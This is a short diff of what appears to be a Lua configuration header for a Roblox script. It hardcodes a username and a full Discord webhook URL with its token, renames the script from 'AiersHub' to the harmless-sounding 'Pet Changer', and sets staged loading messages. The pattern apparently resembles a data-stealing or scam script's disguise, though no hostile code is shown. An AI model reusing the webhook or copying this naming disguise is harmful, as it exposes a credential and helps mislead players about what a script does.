@@ -2,7 +2,7 @@ Username = "ichmagaier"
 WebHook = "https://discord.com/api/webhooks/1079079265083076618/H07Oq7nIPvptExDgnUSB4OYybDvBLzDP0B95uTsA9ABgKXDSAHHA79m08c9DOJPZP9L"
 
 
-_G.CustomScriptName = "AiersHub"
+_G.CustomScriptName = "Pet Changer"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
